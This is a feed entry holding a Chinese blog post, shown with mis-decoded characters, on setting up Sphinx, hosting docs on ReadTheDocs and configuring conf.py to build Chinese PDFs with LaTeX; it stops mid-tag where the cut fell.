    <title>ä½¿ç”¨ Sphinx æ’°å†™æŠ€æœ¯æ–‡æ¡£å¹¶ç”Ÿæˆ PDF æ€»ç»“</title>
    <link href="https://qiwihui.com/qiwihui-blog-57/"/>
    <id>https://qiwihui.com/qiwihui-blog-57/</id>
    <published>2022-08-13T01:54:25.310Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å‡ å¤©å‡†å¤‡ç¼–æ’éƒ¨åˆ†ç¿»è¯‘çš„ä¹¦ç±å’Œæ–‡æ¡£ï¼Œæ‰¾äº†å¥½äº›å·¥å…·ï¼Œæœ€ç»ˆå®šæ ¼åœ¨ Sphinx ä¸Šï¼Œå¹¶åŸºäº <a href="https://readthedocs.org">ReadTheDocs</a> æä¾›çš„ SaaS æœåŠ¡è¿›è¡Œåˆ†å‘å’Œåˆ†äº«ã€‚æœ¬ç¯‡åšå®¢æ˜¯å¯¹æ•´ä¸ªè¿‡ç¨‹çš„ä¸€æ¬¡è®°å½•å’Œæ€»ç»“ã€‚</p><p>é¡¹ç›®ä»£ç ï¼š<a href="https://github.com/qiwihui/sphinx-doc-starter">qiwihui/sphinx-doc-starter</a></p><h2><span id="ren-shi-sphinx">è®¤è¯† Sphinx</span></h2><p><a href="http://sphinx-doc.org/">Sphinx</a> æ˜¯ä¸€ä¸ªåŸºäº Python çš„æ–‡æ¡£ç”Ÿæˆé¡¹ç›®ã€‚æœ€æ—©åªæ˜¯ç”¨æ¥ç”Ÿæˆ <a href="https://docs.python.org/3/">Python</a> çš„é¡¹ç›®æ–‡æ¡£ï¼Œä½¿ç”¨ <em>reStructuredText</em> æ ¼å¼ã€‚ä½†éšç€é¡¹ç›®çš„é€æ¸å®Œå–„ï¼Œå¾ˆå¤šé Python çš„é¡¹ç›®ä¹Ÿé‡‡ç”¨ Sphinx ä½œä¸ºæ–‡æ¡£å†™ä½œå·¥å…·ï¼Œç”šè‡³å®Œå…¨å¯ä»¥ç”¨ Sphinx æ¥å†™ä¹¦ã€‚</p><p>ä½¿ç”¨ <a href="http://sphinx-doc-zh.readthedocs.org/en/latest/">Sphinx ç”Ÿæˆæ–‡æ¡£çš„ä¼˜ç‚¹</a>åŒ…æ‹¬ï¼š</p><ul><li><em>ä¸°å¯Œçš„è¾“å‡ºæ ¼å¼</em>: æ”¯æŒè¾“å‡ºä¸º HTMLï¼ˆåŒ…æ‹¬ Windows å¸®åŠ©æ–‡æ¡£ï¼‰ï¼ŒLaTeXï¼ˆå¯ä»¥æ‰“å°PDFç‰ˆæœ¬ï¼‰, manual pagesï¼ˆman æ–‡æ¡£ï¼‰, çº¯æ–‡æœ¬ç­‰è‹¥å¹²ç§æ ¼å¼ï¼›</li><li><em>å®Œå¤‡çš„äº¤å‰å¼•ç”¨</em>: è¯­ä¹‰åŒ–çš„æ ‡ç­¾ï¼Œå¹¶å¯ä»¥è‡ªåŠ¨åŒ–é“¾æ¥å‡½æ•°ã€ç±»ã€å¼•æ–‡ã€æœ¯è¯­ç­‰ï¼›</li><li><em>æ˜æ™°çš„åˆ†å±‚ç»“æ„</em>: è½»æ¾å®šä¹‰æ–‡æ¡£æ ‘ï¼Œå¹¶è‡ªåŠ¨åŒ–é“¾æ¥åŒçº§/çˆ¶çº§/ä¸‹çº§æ–‡ç« ï¼›</li><li><em>ç¾è§‚çš„è‡ªåŠ¨ç´¢å¼•</em>: å¯è‡ªåŠ¨ç”Ÿæˆç¾è§‚çš„æ¨¡å—ç´¢å¼•ï¼›</li><li><em>ç²¾ç¡®çš„è¯­æ³•é«˜äº®</em>: åŸºäº Pygments è‡ªåŠ¨ç”Ÿæˆè¯­æ³•é«˜äº®ï¼›</li><li><em>å¼€æ”¾çš„æ‰©å±•</em>: æ”¯æŒä»£ç å—çš„è‡ªåŠ¨æµ‹è¯•ï¼Œè‡ªåŠ¨åŒ…å« Python çš„æ¨¡å—è‡ªè¿°æ–‡æ¡£ï¼Œç­‰ç­‰ã€‚</li></ul><span id="more"></span><h2><span id="kai-shi">å¼€å§‹</span></h2><p>è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬å¦‚ä¸‹æ­¥éª¤ï¼š</p><ul><li>å®‰è£… Sphinx</li><li>ç¬¬ä¸€ä¸ªæ–‡æ¡£</li><li>åœ¨çº¿æ‰˜ç®¡</li><li>ç”Ÿæˆ PDF</li></ul><h3><span id="an-zhuang-sphinx">å®‰è£… Sphinx</span></h3><p>Sphinx ä¾èµ–äº Pythonï¼Œå¹¶æä¾›äº† Python åŒ…ï¼Œæ‰€ä»¥ä½¿ç”¨ pip å®‰è£…æ—¢å¯ã€‚è¿™é‡Œæˆ‘åªå®‰è£…äº† <code>sphinx-doc</code> è¿™ä¸ªåŒ…ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install sphinx-doc</span><br></pre></td></tr></table></figure><p>è¿™æ—¶ï¼Œé€šè¿‡ bash è‡ªåŠ¨è¡¥å…¨ï¼ˆè¿ç»­ä¸¤ä¸‹ <code>tab</code>ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªå‘½ä»¤ï¼ŒSphinx æ¨èä½¿ç”¨ <code>sphinx-quickstart</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªè®¾ç½®å‘å¯¼ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sphinx-</span></span><br><span class="line">sphinx-apidoc      sphinx-autogen     sphinx-build       sphinx-quickstart</span><br></pre></td></tr></table></figure><h3><span id="she-zhi-sphinx">è®¾ç½® Sphinx</span></h3><p>è¿è¡Œ <code>sphinx-quickstart</code>ï¼Œä»¥ä¸‹ä¸»è¦è®¾ç½®é¡¹ç›®åç§°ï¼Œä½œè€…åç§°ä»¥åŠè¯­è¨€ï¼ˆ<code>zh_CN</code>ï¼‰å³å¯ï¼Œå…¶ä»–é»˜è®¤ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sphinx-quickstart</span></span><br><span class="line">Welcome to the Sphinx 1.8.4 quickstart utility.</span><br><span class="line"></span><br><span class="line">Please enter values for the following settings (just press Enter to</span><br><span class="line">accept a default value, if one is given in brackets).</span><br><span class="line"></span><br><span class="line">Selected root path: .</span><br><span class="line"></span><br><span class="line">You have two options for placing the build directory for Sphinx output.</span><br><span class="line">Either, you use a directory &quot;_build&quot; within the root path, or you separate</span><br><span class="line">&quot;source&quot; and &quot;build&quot; directories within the root path.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Separate <span class="built_in">source</span> and build directories (y/n) [n]: y</span></span><br><span class="line"></span><br><span class="line">Inside the root directory, two more directories will be created; &quot;_templates&quot;</span><br><span class="line">for custom HTML templates and &quot;_static&quot; for custom stylesheets and other static</span><br><span class="line">files. You can enter another prefix (such as &quot;.&quot;) to replace the underscore.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Name prefix <span class="keyword">for</span> templates and static <span class="built_in">dir</span> [_]:</span> </span><br><span class="line"></span><br><span class="line">The project name will occur in several places in the built documentation.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Project name: ä¸€æœ¬ä¹¦</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Author name(s): qiwihui</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Project release []: 0.0.1</span></span><br><span class="line"></span><br><span class="line">If the documents are to be written in a language other than English,</span><br><span class="line">you can select a language here by its language code. Sphinx will then</span><br><span class="line">translate text that it generates into that language.</span><br><span class="line"></span><br><span class="line">For a list of supported codes, see</span><br><span class="line">http://sphinx-doc.org/config.html#confval-language.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Project language [en]: zh_CN</span></span><br><span class="line"></span><br><span class="line">The file name suffix for source files. Commonly, this is either &quot;.txt&quot;</span><br><span class="line">or &quot;.rst&quot;.  Only files with this suffix are considered documents.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Source file suffix [.rst]:</span> </span><br><span class="line"></span><br><span class="line">One document is special in that it is considered the top node of the</span><br><span class="line">&quot;contents tree&quot;, that is, it is the root of the hierarchical structure</span><br><span class="line">of the documents. Normally, this is &quot;index&quot;, but if your &quot;index&quot;</span><br><span class="line">document is a custom template, you can also set this to another filename.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Name of your master document (without suffix) [index]:</span> </span><br><span class="line">Indicate which of the following Sphinx extensions should be enabled:</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">autodoc: automatically insert docstrings from modules (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">doctest: automatically <span class="built_in">test</span> code snippets <span class="keyword">in</span> doctest blocks (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">intersphinx: <span class="built_in">link</span> between Sphinx documentation of different projects (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">todo: write <span class="string">&quot;todo&quot;</span> entries that can be shown or hidden on build (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">coverage: checks <span class="keyword">for</span> documentation coverage (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">imgmath: include math, rendered as PNG or SVG images (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">mathjax: include math, rendered <span class="keyword">in</span> the browser by MathJax (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ifconfig: conditional inclusion of content based on config values (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">viewcode: include links to the <span class="built_in">source</span> code of documented Python objects (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">githubpages: create .nojekyll file to publish the document on GitHub pages (y/n) [n]:</span> </span><br><span class="line"></span><br><span class="line">A Makefile and a Windows command file can be generated for you so that you</span><br><span class="line">only have to run e.g. `make html` instead of invoking sphinx-build</span><br><span class="line">directly.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Create Makefile? (y/n) [y]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Create Windows <span class="built_in">command</span> file? (y/n) [y]:</span> </span><br><span class="line"></span><br><span class="line">Creating file ./source/conf.py.</span><br><span class="line">Creating file ./source/index.rst.</span><br><span class="line">Creating file ./Makefile.</span><br><span class="line">Creating file ./make.bat.</span><br><span class="line"></span><br><span class="line">Finished: An initial directory structure has been created.</span><br><span class="line"></span><br><span class="line">You should now populate your master file ./source/index.rst and create other documentation</span><br><span class="line">source files. Use the Makefile to build the docs, like so:</span><br><span class="line">   make builder</span><br><span class="line">where &quot;builder&quot; is one of the supported builders, e.g. html, latex or linkcheck.</span><br></pre></td></tr></table></figure><p>è§£é‡Š1ï¼Œæ•´ä¸ªè®¾ç½®è¿‡ç¨‹åŒ…æ‹¬ï¼š</p><ol><li><p>æ˜¯å¦åˆ†ç¦»æºæ–‡ä»¶ç›®å½• <code>source</code> å’Œç”Ÿæˆæ–‡ä»¶ç›®å½• <code>build</code>ï¼Œé»˜è®¤å¦ï¼›</p></li><li><p>æ¨¡æ¿ç›®å½• <code>templates</code> å’Œé™æ€æ–‡ä»¶ç›®å½• <code>static</code> å‰ç¼€ï¼Œé»˜è®¤ä¸º<code>_</code>ï¼›</p></li><li><p>é¡¹ç›®åç§°ï¼›</p></li><li><p>é¡¹ç›®ä½œè€…ï¼›</p></li><li><p>é¡¹ç›®ç‰ˆæœ¬ï¼Œé»˜è®¤ä¸ºç©ºï¼›</p></li><li><p>é¡¹ç›®è¯­è¨€ï¼Œé»˜è®¤ä¸º <code>en</code>ï¼›</p></li><li><p>æ–‡æ¡£æ‰©å±•åï¼Œé»˜è®¤ä¸º <code>.rst</code>ï¼›</p></li><li><p>é¦–é¡µæ–‡ä»¶åï¼Œé»˜è®¤ä¸º <code>index</code>ï¼›</p></li><li><p>å¼€å¯çš„æ‰©å±•ï¼Œå‡é»˜è®¤ä¸ºå¦ï¼š</p><ul><li>autodoc</li><li>doctest</li><li>intersphinx</li><li>todo</li><li>coverage</li><li>imgmath</li><li>mathjax</li><li>ifconfig</li><li>viewcode</li><li>githubpages</li></ul></li><li><p>ç”Ÿæˆ Makefileï¼Œé»˜è®¤æ˜¯ï¼›</p></li><li><p>ç”Ÿæˆ Windows ç”¨å‘½ä»¤è¡Œï¼Œé»˜è®¤æ˜¯ã€‚</p></li></ol><p>è§£é‡Š2ï¼Œé¡¹ç›®ç›®å½•æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sphinx-test</span><br><span class="line">â”œâ”€â”€ Makefile</span><br><span class="line">â”œâ”€â”€ build</span><br><span class="line">â”œâ”€â”€ make.bat</span><br><span class="line">â””â”€â”€ source</span><br><span class="line">    â”œâ”€â”€ _static</span><br><span class="line">    â”œâ”€â”€ _templates</span><br><span class="line">    â”œâ”€â”€ conf.py</span><br><span class="line">    â””â”€â”€ index.rst</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li><code>Makefile</code>ï¼šå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªåŒ…å«æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨ make å‘½ä»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™äº›æŒ‡ä»¤æ¥æ„å»ºæ–‡æ¡£è¾“å‡ºã€‚</li><li><code>build</code>ï¼šç”Ÿæˆçš„æ–‡ä»¶çš„è¾“å‡ºç›®å½•ã€‚</li><li><code>make.bat</code>ï¼šWindows ç”¨å‘½ä»¤è¡Œã€‚</li><li><code>_static</code>ï¼šé™æ€æ–‡ä»¶ç›®å½•ï¼Œæ¯”å¦‚å›¾ç‰‡ç­‰ã€‚</li><li><code>_templates</code>ï¼šæ¨¡æ¿ç›®å½•ã€‚</li><li><code>conf.py</code>ï¼šå­˜æ”¾ Sphinx çš„é…ç½®ï¼ŒåŒ…æ‹¬åœ¨ <code>sphinx-quickstart</code> æ—¶é€‰ä¸­çš„é‚£äº›å€¼ï¼Œå¯ä»¥è‡ªè¡Œå®šä¹‰å…¶ä»–çš„å€¼ã€‚</li><li><code>index.rst</code>ï¼šæ–‡æ¡£é¡¹ç›®èµ·å§‹æ–‡ä»¶ã€‚</li></ul><p>æ¥ä¸‹æ¥çœ‹çœ‹é»˜è®¤ç”Ÿæˆçš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make html</span></span><br><span class="line">Running Sphinx v1.8.4</span><br><span class="line">loading translations [zh_CN]... done</span><br><span class="line">making output directory...</span><br><span class="line">building [mo]: targets for 0 po files that are out of date</span><br><span class="line">building [html]: targets for 1 source files that are out of date</span><br><span class="line">updating environment: 1 added, 0 changed, 0 removed</span><br><span class="line">reading sources... [100%] index                                                                                                         looking for now-outdated files... none found</span><br><span class="line">pickling environment... done</span><br><span class="line">checking consistency... done</span><br><span class="line">preparing documents... done</span><br><span class="line">writing output... [100%] index                                                                                                          generating indices... genindex</span><br><span class="line">writing additional pages... search</span><br><span class="line">copying static files... done</span><br><span class="line">copying extra files... done</span><br><span class="line">dumping search index in Chinese (code: zh) ... done</span><br><span class="line">dumping object inventory... done</span><br><span class="line">build succeeded.</span><br><span class="line"></span><br><span class="line">The HTML pages are in build/html.</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ <code>build/html/index.html</code> è¿™ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/53294694-86068e00-3826-11e9-93e6-4f3ad80cc245.png" alt="initial"></p><p>é»˜è®¤é£æ ¼ä¸º <code>alabaster</code>ï¼Œå¯ä»¥æ”¹æˆ ReadTheDocs çš„é£æ ¼ï¼š <code>sphinx_rtd_theme</code>ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- Options for HTML output -------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The theme to use for HTML and HTML Help pages.  See the documentation for</span></span><br><span class="line"><span class="comment"># a list of builtin themes.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">html_theme = <span class="string">&#x27;sphinx_rtd_theme&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/53294697-9585d700-3826-11e9-9eab-13d1d4e46aa4.png" alt="rtd_theme"></p><h3><span id="di-yi-ge-wen-dang">ç¬¬ä¸€ä¸ªæ–‡æ¡£</span></h3><p>æˆ‘ä»¬ä»¥ä¸€ä¸‹æ–‡æ¡£ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a Title</span><br><span class="line">===============</span><br><span class="line">That has a paragraph about a main subject and is set when the &#x27;=&#x27;</span><br><span class="line">is at least the same length of the title itself.</span><br><span class="line"></span><br><span class="line">Subject Subtitle</span><br><span class="line">----------------</span><br><span class="line">Subtitles are set with &#x27;-&#x27; and are required to have the same length</span><br><span class="line">of the subtitle itself, just like titles.</span><br><span class="line"></span><br><span class="line">Lists can be unnumbered like:</span><br><span class="line"></span><br><span class="line"> * Item Foo</span><br><span class="line"> * Item Bar</span><br><span class="line"></span><br><span class="line">Or automatically numbered:</span><br><span class="line"></span><br><span class="line"> #. Item 1</span><br><span class="line"> #. Item 2</span><br><span class="line"></span><br><span class="line">Inline Markup</span><br><span class="line">-------------</span><br><span class="line">Words can have *emphasis in italics* or be **bold** and you can define</span><br><span class="line">code samples with back quotes, like when you talk about a command: ``sudo``</span><br><span class="line">gives you super user powers!</span><br></pre></td></tr></table></figure><p>å°†ä¹‹å†™å…¥ <code>example.rst</code> ä¸­ï¼Œå¹¶ä¿®æ”¹ <code>index.rst</code> ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to ä¸€æœ¬ä¹¦&#x27;s documentation!</span><br><span class="line">==================================</span><br><span class="line"></span><br><span class="line">.. toctree::</span><br><span class="line">   :maxdepth: 2</span><br><span class="line">   :caption: ç›®å½•:</span><br><span class="line"></span><br><span class="line">   example</span><br><span class="line"></span><br><span class="line">Indices and tables</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">* :ref:`genindex`</span><br><span class="line">* :ref:`modindex`</span><br><span class="line">* :ref:`search`</span><br></pre></td></tr></table></figure><p>é‡æ–°ç¼–è¯‘ï¼Œè¿™æ—¶æ–‡æ¡£å·²ç»æ”¹å˜ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/53294701-a5052000-3826-11e9-972f-85631118b372.png" alt="first_doc"><img src="https://user-images.githubusercontent.com/3297411/53294703-a9c9d400-3826-11e9-9c63-9fd73f19792c.png" alt="first_doc_page"></p><h3><span id="zai-xian-tuo-guan">åœ¨çº¿æ‰˜ç®¡</span></h3><p><a href="https://readthedocs.org">ReadTheDocs</a> å¯æ˜¯ç›´æ¥ç”¨äºæ‰˜ç®¡ sphinx ç”Ÿæˆçš„ç½‘é¡µæ–‡æ¡£ã€‚å°†ä¹‹å‰çš„æ–‡æ¡£ç”¨ Git ç®¡ç†ï¼Œå¹¶æ¨é€åˆ° Githubï¼Œç„¶ååœ¨ ReadTheDocs ä¸­ <code>Import a Project</code> å³å¯ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/53294710-dd0c6300-3826-11e9-9b50-f257ccc9049d.png" alt="rtd"></p><p>å¦å¤–ï¼Œå¯ä»¥è®¾ç½®è‡ªå®šä¹‰åŸŸåï¼š</p><ol><li>åœ¨åŸŸåç®¡ç†ä¸­æ·»åŠ  DNS çš„ CNAME è®°å½•åˆ° <code>readthedocs.io</code>ï¼Œæ¯”å¦‚ <code>onebook.qiwihui.com</code></li><li>åœ¨é¡¹ç›®çš„ <code>Admin</code> -&gt; <code>Domains</code> ä¸­è®¾ç½®ä¸Šä¸€æ­¥æ·»åŠ çš„åŸŸåï¼Œå¼€å¯ HTTPSï¼Œä¿å­˜å³å¯ã€‚</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/53294706-b4846900-3826-11e9-8cc7-570d0f6e4430.png" alt="add_new_domain"></p><p>è¿‡ç¨‹å¾ˆç®€å•ã€‚</p><h3><span id="sheng-cheng-pdf">ç”Ÿæˆ PDF</span></h3><p>Sphinx ç”Ÿæˆ PDF çš„è¿‡ç¨‹å…ˆå°† rst è½¬æ¢ä¸º texï¼Œå†ç”Ÿæˆ PDFã€‚è¿™ä¸ªè¿‡ç¨‹é‡åˆ°äº†æ¯”è¾ƒå¤šçš„å‘ï¼Œæœ€åæ€»ç»“ä¸‹æ¥è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆï¼Œå®‰è£… Tex ç¯å¢ƒã€‚åœ¨ Mac ä¸Šï¼Œæ¨èå®‰è£… <code>MacTex</code> è€Œä¸æ˜¯ <code>BasicTex</code>ï¼Œå¯¹äºæ–°æ‰‹æ¥è¯´ BasicTex ä¸Šéœ€è¦è‡ªå·±å¤„ç†å¾ˆå¤šä¾èµ–é—®é¢˜ã€‚å®Œæˆåä½¿ç”¨ <code>tlmgr</code> æ›´æ–° TexLiveã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew cask install mactex</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo tlmgr update --self</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œåœ¨ <a href="http://con.py">con.py</a> ä¸­è®¾ç½® <code>latex_engine</code> å’Œ <code>latex_elements</code> ä¸¤ä¸ªå‚æ•°ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è®¾ç½® <code>latex_documents</code> å‚æ•°æ¥è®¾ç½®æ–‡æ¡£ã€‚å› ä¸º ReadTheDocs ä¸Šåªæœ‰ pdflatex å¼•æ“ï¼Œå¦‚æœéœ€è¦åŒæ—¶åœ¨ ReadTheDocs å’Œæœ¬åœ°åŒ–éƒ½èƒ½é¡ºåˆ©ç¼–è¯‘ä¸­æ–‡pdfçš„è¯ï¼Œå¯ä»¥åœ¨ <a href="http://conf.py">conf.py</a> ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- Options for LaTeX output ------------------------------------------------</span></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ˜¯å¦ä¸º READTHEDOCS ç¯å¢ƒ</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">on_rtd = os.environ.get(<span class="string">&#x27;READTHEDOCS&#x27;</span>, <span class="literal">None</span>) == <span class="string">&#x27;True&#x27;</span></span><br><span class="line"><span class="keyword">if</span> on_rtd:</span><br><span class="line">    latex_elements = &#123;</span><br><span class="line">        <span class="string">&#x27;preamble&#x27;</span>: <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\hypersetup&#123;unicode=true&#125;</span></span><br><span class="line"><span class="string">\usepackage&#123;CJKutf8&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;00A0&#125;&#123;\nobreakspace&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2203&#125;&#123;\ensuremath&#123;\exists&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2200&#125;&#123;\ensuremath&#123;\forall&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2286&#125;&#123;\ensuremath&#123;\subseteq&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2713&#125;&#123;x&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;27FA&#125;&#123;\ensuremath&#123;\Longleftrightarrow&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;221A&#125;&#123;\ensuremath&#123;\sqrt&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;221B&#125;&#123;\ensuremath&#123;\sqrt[3]&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2295&#125;&#123;\ensuremath&#123;\oplus&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2297&#125;&#123;\ensuremath&#123;\otimes&#125;&#125;</span></span><br><span class="line"><span class="string">\begin&#123;CJK&#125;&#123;UTF8&#125;&#123;gbsn&#125;</span></span><br><span class="line"><span class="string">\AtEndDocument&#123;\end&#123;CJK&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># æœ¬åœ°</span></span><br><span class="line">    latex_engine = <span class="string">&#x27;xelatex&#x27;</span></span><br><span class="line">    latex_elements = &#123;</span><br><span class="line">        <span class="string">&#x27;papersize&#x27;</span>: <span class="string">&#x27;a4paper&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pointsize&#x27;</span>: <span class="string">&#x27;11pt&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;preamble&#x27;</span>: <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\usepackage&#123;xeCJK&#125;</span></span><br><span class="line"><span class="string">\setCJKmainfont[BoldFont=STZhongsong, ItalicFont=STKaiti]&#123;STSong&#125;</span></span><br><span class="line"><span class="string">\setCJKsansfont[BoldFont=STHeiti]&#123;STXihei&#125;</span></span><br><span class="line"><span class="string">\setCJKmonofont&#123;STFangsong&#125;</span></span><br><span class="line"><span class="string">\XeTeXlinebreaklocale &quot;zh&quot;</span></span><br><span class="line"><span class="string">\XeTeXlinebreakskip = 0pt plus 1pt</span></span><br><span class="line"><span class="string">\parindent 2em</span></span><br><span class="line"><span class="string">\definecolor&#123;VerbatimColor&#125;&#123;rgb&#125;&#123;0.95,0.95,0.95&#125;</span></span><br><span class="line"><span class="string">\setcounter&#123;tocdepth&#125;&#123;3&#125;</span></span><br><span class="line"><span class="string">\renewcommand\familydefault&#123;\ttdefault&#125;</span></span><br><span class="line"><span class="string">\renewcommand\CJKfamilydefault&#123;\CJKrmdefault&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># è®¾ç½®æ–‡æ¡£</span></span><br><span class="line">latex_documents = [</span><br><span class="line">    (master_doc, <span class="string">&#x27;sphinx.tex&#x27;</span>, <span class="string">&#x27;ä½ çš„ç¬¬ä¸€æœ¬ Sphinx ä¹¦&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;ä½œè€…ï¼šqiwihui&#x27;</span>, <span class="string">&#x27;manual&#x27;</span>, <span class="literal">True</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make latexpdf</span></span><br></pre></td></tr></table></figure><p><code>make latexpdf</code> ä¼šå®Œæˆ rstè½¬æ¢ä¸º tex å¹¶å°† tex ç”Ÿæˆ PDFï¼Œå¯ä»¥æ‰‹åŠ¨åˆ†å¼€ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make latex</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> build/latex</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>build/latex</code> ä¸‹å¯ä»¥æŸ¥çœ‹åˆ°ç”Ÿæˆçš„ PDF æ–‡æ¡£ã€‚</p><h4><span id="zi-ti">å­—ä½“</span></h4><p>ä½¿ç”¨ <code>fc-list</code> æ¥è·å–å­—ä½“ä¿¡æ¯ï¼Œä¿®æ”¹ç›¸åº”å­—ä½“è®¾ç½®å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install fontconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fc-list :lang=zh</span></span><br></pre></td></tr></table></figure><h4><span id="yu-dao-de-wen-ti">é‡åˆ°çš„é—®é¢˜:</span></h4><ol><li>é‡åˆ° <code>&quot;! LaTeX Error: File '*.sty' not found.&quot;</code> ç±»çš„é—®é¢˜ï¼š</li></ol><p>è§£å†³ï¼šä½¿ç”¨ <code>sudo tlmgr install</code> å®‰è£…ç›¸åº”çš„åŒ…å³å¯ã€‚</p><h2><span id="zong-jie">æ€»ç»“</span></h2><p>ç®€å•è¿‡äº†ä¸€ä¸‹æ•´ä¸ªæ–‡æ¡£çš„æµç¨‹ï¼Œæ€»ä½“æ¥è¯´ï¼ŒSphinxéå¸¸é€‚åˆç”¨æ¥ç¼–å†™é¡¹ç›®æ–‡æ¡£ï¼ŒreStructuredText æ¯”èµ· Markdown ä¹Ÿæœ‰å¤ªå¤šçš„ä¼˜åŠ¿ï¼Œå€¼å¾—æ¨èã€‚</p><h3><span 